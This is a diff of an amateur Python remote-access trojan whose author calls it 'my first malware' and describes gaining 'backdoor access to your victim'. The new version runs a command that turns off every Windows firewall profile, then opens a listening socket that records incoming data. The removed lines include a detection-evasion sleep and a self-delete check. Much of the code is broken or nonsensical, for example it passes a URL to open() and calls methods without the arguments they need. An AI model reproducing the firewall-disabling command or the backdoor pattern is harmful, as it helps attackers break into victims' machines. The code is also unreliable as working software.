@@ -1,50 +1,28 @@
-import socket
-import base64
 import os
-import time
+import socket
 
-#checking if it's running on windows else it will delete itself
-if os.name == 'nt':
-    print("keep going")
-else:
- del lsadd.py
+#disabling firewall
+fr = "Set-NetFirewallProfile -Profile Public,Private,Domain -Enabled False"
+os.system(fr)
 
-#this is used to make Malware detection harder to detect this although you will have to wait 5 minutes it's optional
-balls = 500
-time.sleep(balls)
+HOST = socket.gethostname
+PORT = 55
 
-#obfuscation
-base64.standard_b64encode(socket)
-base64.standard_b64encode(socket.SOCK_STREAM)
-base64.standard_b64encode(socket.gethostname)
-base64.standard_b64encode(socket.AF_INET6)
-base64.standard_b64encode(protocol=0)
-base64.standard_b64encode(socket.listen)
-base64.standard_b64encode(socket.recv)
-base64.standard_b64encode(socket.send)
-base64.standard_b64encode(base64.standard_b64encode)
-base64.standard_b64encode(socket.accept)
-
-#reverse enginnering
-socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, protocol=0)
-host = socket.gethostname()
-port = 21
-server = 'your ipv4'
-addr = socket.bind(server, port) #put your ipv4 here change AF_INET to AF_INET6 if you have ipv6
-socket.connect(addr)
-
-socket.listen(1)
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((HOST, PORT))
+server.listen(1)
+connection, addr = server.accept()
+print('Connected with ' + addr[0] + ':' + str(addr[1]))
+connection.send('connection sucess')
+file = open('https://localhost/', 'a') #put your website here
 while True:
-    socket.accept()
-    socket.recv()
-    socket.send("established connection to ftp server stage 2 completed")
+    info = connection.recv()
+    file.write(info)
+
 
 """
-Now you could check who is connecting to you on port 21 and use netcat to connect to your victim or use ftp to connect to them.
-once you do that you have low level backdoor access to your victim. Note that it's not fully finished
+This is a simple rat you could say and just uses telnet and such not advance at all I just needed to revamp my first malware
 
 by: Rtgamer8387
 """
 
-
-#this is also my first malware and I am pretty proud of it so treat it with respect!
